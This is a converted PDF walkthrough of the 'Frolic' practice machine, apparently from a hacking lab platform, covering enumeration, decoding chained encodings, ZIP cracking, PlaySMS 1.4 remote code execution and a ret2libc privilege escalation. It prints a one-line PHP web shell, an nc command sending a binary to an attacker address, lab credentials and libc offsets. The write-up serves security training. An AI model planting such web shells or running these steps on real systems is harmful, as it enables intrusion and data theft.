# Frolic

*Converted from: Frolic.pdf*

---

# Frolic
## **23 [rd] March 2019 / Document No D19.100.11**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: Felamos**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 10


## **SYNOPSIS**

Frolic is not overly challenging, however a great deal of enumeration is required due to the

amount of services and content running on the machine. The privilege escalation features an

easy difficulty return-oriented programming (ROP) exploitation challenge, and is a great learning

experience for beginners.


## **Skills Required**


  - Intermediate/advanced Linux

knowledge

  - Basic understanding of return-oriented

programming and the ret2libc method


## **Skills Learned**


  - Identifying esoteric languages

  - Identifying various encoding methods

  - Cracking password-protected ZIP files

  - Identifying vulnerable services

  - Escalating privileges through ROP SUID

binaries with ret2libc


Page 2 / 10


## **Enumeration** **Port Scan**

Masscan finds a fair number of open ports, however the nginx server on port 9999 is of particular

interest.


Page 3 / 10


​


## **Dirbuster**

An **/admin** ​ directory can be easily found by directory fuzzing, among many other results that may

be potential attack vectors.


Page 4 / 10



​


​

​


## **Exploitation** **Admin Web Interface**

​

​



​

​



A quick inspection of the admin page’s source code reveals a **/admin/js/login.js** ​ script, which

​



​

contains the credentials in plaintext. It is also possible to browse directly to **success.html** ​ as there



​

​

is no authentication in place.



​

​


Page 5 / 10


​


​ ​


## **Ook, Base64, ZIP Cracking & Brainfuck**

Ook/Brainfuck Decoder: [https://www.splitbrain.org/_static/ook/​](https://www.splitbrain.org/_static/ook/)


The unusual output on **success.html** ​ is **Ook** ​, and can be decoded using the above tool. Browsing

to the given directory outputs a string that appears to be base64. Decoding the base64 outputs a

password protected ZIP file.


Page 6 / 10



​


​ ​



​


​ ​


​


​



​


​



​


​



Using fcrackzip, or one of several alternatives, the password can be recovered very quickly using

virtually any wordlist. The ZIP contains a single **index.php** ​ file, which contains a hex string.

Converting this hex to ascii results in more base64 encoded data.


Decoding the base64 outputs a pattern, which is actually **brainfuck** ​ language. The above Ook

conversion tool also features a brainfuck interpreter, which reveals a password.


Page 7 / 10



​


​



​


​


​

​ ​ ​


​ ​


## **PlaySMS**

Exploit: [https://www.exploit-db.com/exploits/42044​](https://www.exploit-db.com/exploits/42044)


Fuzzing the **/dev** ​ directory finds **/dev/backup** ​, which hints to the existence of a **/playsms** ​

directory. Attempting to login with the credentials admin:idkwhatispass will grant access and

open up multiple new attack vectors, as there are several publicly available exploits for PlaySMS

1.4.


By crafting a malicious CSV file with the first field containing PHP code, remote code execution is

achieved with minimal effort. However, as the file is not written to the server, it is a good idea to

create a cleaner method for code execution. In this case, the below base64 is decoded and

written to **/playsms/writeup.php** ​ . This file simply contains **<?php echo exec($_GET[‘c’]); ?>** ​ and

makes obtaining a shell much more simple.


Page 8 / 10



​

​ ​ ​


​ ​



​

​ ​ ​


​ ​


​

​ ​


​


​


​


​


## **Privilege Escalation** **SUID ret2libc**

​

​ ​


​


​


​


​



After obtaining a shell, an interesting SUID binary can be found at **/home/ayush/.binary/rop** ​ . This

​ ​


​


​


​


​



​

can be transferred from to the attacking machine using **nc -nlp 1235 > rop** ​ locally, followed by **nc** ​


​


​


​


​



​

​ ​

**-w 3 10.10.14.x 1235 < rop** on the target.


​


​


​


​



​

​ ​


​


​


​


​



​

​ ​


**libc_addr** is **0xb7e19000** ​


**system_addr** is **0003ada0** ​


**exit_addr** is **0002e9d0** ​


**sh_addr** is **15ba0b** ​



​

​ ​


​


​


​


​



​

​ ​


​


​


​


​



​

​ ​


​


​


​


​


Page 9 / 10


Using this information, it is fairly straightforward to craft a payload to exploit the binary.


Page 10 / 10


